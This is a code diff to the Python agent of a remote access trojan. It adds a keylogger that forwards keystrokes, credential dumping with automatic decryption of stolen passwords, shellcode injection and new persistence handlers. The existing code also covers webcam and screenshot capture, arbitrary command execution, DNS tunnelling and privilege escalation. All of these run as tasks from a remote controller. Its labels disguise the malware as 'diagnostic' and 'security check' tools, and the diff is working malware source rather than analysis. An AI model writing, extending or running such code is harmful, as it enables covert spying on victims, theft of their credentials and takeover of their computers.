@@ -17,14 +17,15 @@ from cryptography.fernet import Fernet
 # Import system monitoring and diagnostic modules
 from modules.system_info import get_system_info
 from modules.process import list_processes
-from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger, is_keylogger_running, get_current_keylogger_text
+from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger, is_keylogger_running, get_current_keylogger_text, send_current_keylog_data
 from modules.shell import execute_command
 from modules.files import list_directory, read_file
 from modules.shellcode import inject_shellcode
 from modules.dns_tunnel import start_dns_tunnel
 from modules.privesc import attempt_privilege_escalation
 from modules.credential_dump import dump_credentials
-from modules.persistence import install_persistence
+from modules.credential_decryptor import decrypt_credentials_auto
+from modules.persistence import handle_persistence_task
 
 # Legacy scanner imports removed - functionality replaced by enhanced modules
 
@@ -96,16 +97,25 @@ def get_encryption_key():
     return base64.urlsafe_b64encode(key_hash[:32])
 
 def encrypt_data(data):
-    """Encrypt data using base64 encoding (temporarily simplified for compatibility)"""
+    """Encrypt data using base64 encoding with proper Unicode handling"""
     try:
         if isinstance(data, dict):
-            data = json.dumps(data)
+            # Convert to JSON with proper Unicode handling
+            data = json.dumps(data, ensure_ascii=False, default=str)
         elif isinstance(data, bytes):
-            data = data.decode()
-        return base64.b64encode(data.encode()).decode()
+            data = data.decode('utf-8', errors='replace')
+        
+        # Encode to base64 with proper Unicode support
+        return base64.b64encode(data.encode('utf-8')).decode('utf-8')
     except Exception as e:
         logging.error(f"Encoding error: {e}")
-        return str(data)
+        # Fallback: convert to string and encode
+        try:
+            data_str = str(data)
+            return base64.b64encode(data_str.encode('utf-8', errors='replace')).decode('utf-8')
+        except Exception as fallback_error:
+            logging.error(f"Fallback encoding also failed: {fallback_error}")
+            return str(data)
 
 def decrypt_data(encrypted_data):
     """Decrypt data using base64 decoding (temporarily simplified for compatibility)"""
@@ -328,6 +338,25 @@ def send_vulnerability_data(vuln_data):
     except Exception as e:
         logging.error(f"Error sending vulnerability data: {str(e)}")
 
+def auto_decrypt_credentials(credential_result):
+    """Automatically decrypt credential dump results"""
+    try:
+        if isinstance(credential_result, dict) and credential_result.get('status') == 'success':
+            # Decrypt the credentials automatically
+            decrypted_result = decrypt_credentials_auto(credential_result)
+            
+            # Add decryption info to the result
+            credential_result['auto_decrypted'] = True
+            credential_result['decrypted_data'] = decrypted_result
+            
+            logging.info(f"Auto-decrypted {decrypted_result.get('summary', {}).get('successfully_decrypted', 0)} credentials")
+            
+        return credential_result
+    except Exception as e:
+        logging.error(f"Auto-decryption failed: {e}")
+        # Return original result if decryption fails
+        return credential_result
+
 def run_task(task):
     """Execute a task and send back the result"""
     task_id = task.get('task_id')
@@ -337,24 +366,21 @@ def run_task(task):
 
     try:
         logging.info(f"Executing task {task_id} of type {task_type}")
-        # Map diagnostic task types to system functions
+        # Define task handlers with proper scope
+        def get_keylogger_send_handler():
+            return send_current_keylog_data() if is_keylogger_running() else {'status': 'error', 'message': 'Keylogger not running'}
+        
         task_handlers = {
-            'system.get_info': get_system_info,
-            'system_get_info': get_system_info,
+            'system.info': get_system_info,
+            'system_info': get_system_info,
             'process.list': list_processes,
             'process_list': list_processes,
-            'monitor.screenshot': take_screenshot,
-            'monitor_screenshot': take_screenshot,
             'surveillance.screenshot': take_screenshot,
             'surveillance_screenshot': take_screenshot,
-            'monitor.webcam': capture_webcam,
-            'monitor_webcam': capture_webcam,
             'surveillance.webcam': capture_webcam,
             'surveillance_webcam': capture_webcam,
-            'monitor.keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
-            'monitor_keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
-            'surveillance.keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
-            'surveillance_keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
+            'surveillance.keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
+            'surveillance_keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
             'surveillance.keylogger.text': lambda: get_current_keylogger_text() if is_keylogger_running() else {'status': 'error', 'message': 'Keylogger not running'},
             'surveillance_keylogger_text': lambda: get_current_keylogger_text() if is_keylogger_running() else {'status': 'error', 'message': 'Keylogger not running'},
             'terminal.execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
@@ -363,14 +389,24 @@ def run_task(task):
             'files_browser': lambda: list_directory(task_data.get('path', '.')),
             'diagnostic.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
             'diagnostic_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'shellcode.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'shellcode_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
             'network.tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
             'network_tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
             'security.check': attempt_privilege_escalation,
             'security_check': attempt_privilege_escalation,
             'auth.collect': lambda: dump_credentials(task_id),
             'auth_collect': lambda: dump_credentials(task_id),
-            'service.install': lambda: install_persistence(task_data.get('method', 'registry')),
-            'service_install': lambda: install_persistence(task_data.get('method', 'registry')),
+            'credentials.dump': lambda: (logging.info("Executing credentials.dump task"), logging.info(f"Result: {dump_credentials(task_id)}"), dump_credentials(task_id))[2],
+            'credentials_dump': lambda: (logging.info("Executing credentials_dump task"), logging.info(f"Result: {dump_credentials(task_id)}"), dump_credentials(task_id))[2],
+            'service.install': lambda: handle_persistence_task('service_install', task_data),
+            'service_install': lambda: handle_persistence_task('service_install', task_data),
+            'persistence.install': lambda: handle_persistence_task('persistence_install', task_data),
+            'persistence_install': lambda: handle_persistence_task('persistence_install', task_data),
+            'persistence.list': lambda: handle_persistence_task('persistence_list', task_data),
+            'persistence_list': lambda: handle_persistence_task('persistence_list', task_data),
+            'persistence.remove': lambda: handle_persistence_task('persistence_remove', task_data),
+            'persistence_remove': lambda: handle_persistence_task('persistence_remove', task_data),
             'files.download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
             'files_download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
             
@@ -409,9 +445,11 @@ def run_task(task):
         # Execute the task
         if task_type in task_handlers:
             result = task_handlers[task_type]()
+            logging.info(f"Task {task_type} executed, result type: {type(result)}")
         else:
             result = f"Unknown task type: {task_type}"
-        # Flatten file/image results for download
+        
+        # Define file types for special handling
         file_types = [
             'files.download', 'files_download',
             'surveillance.screenshot', 'surveillance_screenshot',
@@ -419,7 +457,19 @@ def run_task(task):
             'surveillance.keylogger', 'surveillance_keylogger',
             'surveillance.keylogger.text', 'surveillance_keylogger_text'
         ]
-        if task_type in file_types and isinstance(result, dict) and 'data' in result:
+        
+        # Handle different result types
+        if task_type in ['credentials.dump', 'credentials_dump', 'auth.collect', 'auth_collect']:
+            # Credential dump results - send as is
+            logging.info(f"Sending credential dump result for task {task_id}")
+            send_result(task_id, {
+                'status': 'success',
+                'data': result,
+                'timestamp': datetime.now().isoformat(),
+                'type': 'credentials_dump'
+            })
+        elif task_type in file_types and isinstance(result, dict) and 'data' in result:
+            # File/image results - flatten for download
             send_result(task_id, {
                 'status': result.get('status', 'success'),
                 'data': result['data'],
@@ -430,6 +480,7 @@ def run_task(task):
                 'type': task_type
             })
         else:
+            # Other results - send as is
             send_result(task_id, {
                 'status': 'success',
                 'data': result,
